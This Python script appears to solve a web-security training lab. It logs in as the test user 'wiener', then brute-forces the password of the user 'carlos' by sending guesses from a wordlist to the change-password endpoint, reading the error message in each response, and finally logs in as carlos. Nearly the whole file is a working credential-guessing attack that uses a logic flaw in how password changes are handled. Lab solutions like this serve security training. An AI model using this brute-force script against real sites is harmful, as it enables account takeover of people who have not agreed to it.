import requests
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

def login_wiener_acc(s, url):
    login_url = url + '/login'
    payload = {
        'username': 'wiener',
        'password': 'peter',
    }
    r = s.post(login_url, data=payload, headers=headers)

    if 'Your username is: wiener' in r.text:
        print('Logged in Wiener account')

def brute_force_pass(s, url):
    change_pass_url = url + '/my-account/change-password'
    passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')
    print('Start bruteforce password...')
    for password in passwords:
        payload = {
            'username': 'carlos',
            'current-password': password,
            'new-password-1': 'tmp1',
            'new-password-2': 'tmp2',
        }
        r = s.post(change_pass_url, data=payload, headers=headers, allow_redirects=False)

        if 'Current password is incorrect' not in r.text:
            print(f'Found Carlos password: {password}')
            return password
    print('Not found Carlos password in the list')
    return None

def login_carlos_acc(s, url, password):
    login_url = url + '/login'
    payload = {
        'username': 'carlos',
        'password': password,
    }
    print('Log in Carlos account...')
    r = s.post(login_url, data=payload, headers=headers, allow_redirects=True)

    if 'Log out' in r.text:
        print('Successful log in Carlos account')
        print('(+) Successful solved lab')
    else:
        print('(-) Fail to login Carlos account')

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    login_wiener_acc(s, url)
    carlos_pass = brute_force_pass(s, url)
    if carlos_pass is None:
        print('[-] Fail to solve lab')
        sys.exit(-1)
    login_carlos_acc(s, url, carlos_pass)

if __name__ == '__main__':
    main()